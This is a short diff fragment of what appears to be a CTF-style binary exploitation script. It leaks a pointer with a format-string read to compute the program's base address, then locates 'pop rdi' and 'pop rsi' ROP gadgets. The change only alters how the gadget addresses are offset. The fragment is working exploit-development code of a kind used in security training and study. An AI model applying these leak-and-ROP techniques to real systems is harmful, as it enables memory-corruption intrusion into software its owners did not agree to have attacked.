@@ -56,11 +56,11 @@ if __name__ == '__main__':
     fox_bar_ptr = FormatStringMagicRead.execute(t, position=15) - 106
     t.file.address = fox_bar_ptr - t.file.symbols['fox_bar']
 
-    pop_rdi_gadget = t.rop.find_gadget(['pop rdi', 'ret']).address + t.file.address
+    pop_rdi_gadget = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
     logger.success(f"pop_rdi_gadget@{hex(pop_rdi_gadget)}")
     check(pop_rdi_gadget, 'pop_rdi_gadget')
 
-    pop_rsi_gadget = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.file.address
+    pop_rsi_gadget = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.base_address_fix
     logger.success(f"pop_rsi_gadget@{hex(pop_rsi_gadget)}")
     check(pop_rsi_gadget, 'pop_rsi_gadget')
 
